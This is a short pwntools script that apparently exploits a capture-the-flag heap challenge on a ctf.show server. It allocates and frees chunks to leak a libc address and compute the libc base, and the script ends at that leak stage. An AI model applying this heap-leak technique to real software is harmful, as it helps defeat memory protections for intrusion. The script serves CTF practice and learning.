from pwn import* 
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28222)
libc = ELF('/home/bit/libc/64bit/libc-2.23.so')
def add(size,name,message):
    io.sendlineafter('Your choice : ','1')
    io.sendlineafter('name: ',str(size))
    io.sendlineafter('name:',name)
    io.sendlineafter('game\'s message:',message)
def show():
    io.sendlineafter('Your choice : ','2')
def free(idx):
    io.sendlineafter('Your choice : ','3')
    io.sendlineafter('game\'s index:',str(idx))
add(0xa8,'aaaa','aaaa')
add(0x68,'bbbb','bbbb')
add(0x68,'a','a')
free(0)
add(0x78,'a'*7,'a')
show()
io.recvuntil('a'*7+'\x0a')
libc_base = u64(io.recv(6)+'\x00\x00') - 0x3C4B78
